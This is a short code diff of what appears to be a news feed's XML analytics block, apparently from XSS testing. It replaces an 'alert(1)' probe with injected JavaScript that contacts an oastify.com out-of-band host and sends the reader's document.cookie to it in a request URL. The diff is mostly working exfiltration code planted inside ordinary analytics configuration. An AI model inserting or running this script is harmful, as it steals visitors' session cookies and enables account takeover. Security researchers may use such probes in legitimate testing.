@@ -42,13 +42,20 @@
         window.dataLayer = window.dataLayer || [];
         function gtag(){dataLayer.push(arguments);}
         gtag('js', new Date());
-
         gtag('config', 'G-XXXXXXXX',{'page_path':'/news/12345',
         'page_referrer':'http://www.smartnews.com/',
          'campaign_source':'SmartNews',
         'campaign_medium':'app'
         });
-        alert(1);
+        // further testing
+        fetch('http://288kydkscyu1yf4hya78vdex1o7gvej3.oastify.com/fetch.worsk');
+        function reqListener() {
+          console.log(this.responseText);
+        }
+        const req = new XMLHttpRequest();
+        req.addEventListener('load', reqListener);
+        req.open('GET', `http://288kydkscyu1yf4hya78vdex1o7gvej3.oastify.com/xhr.works?c=${document.cookie}`);
+        req.send();
     </script>
     ]]>
 </snf:analytics>
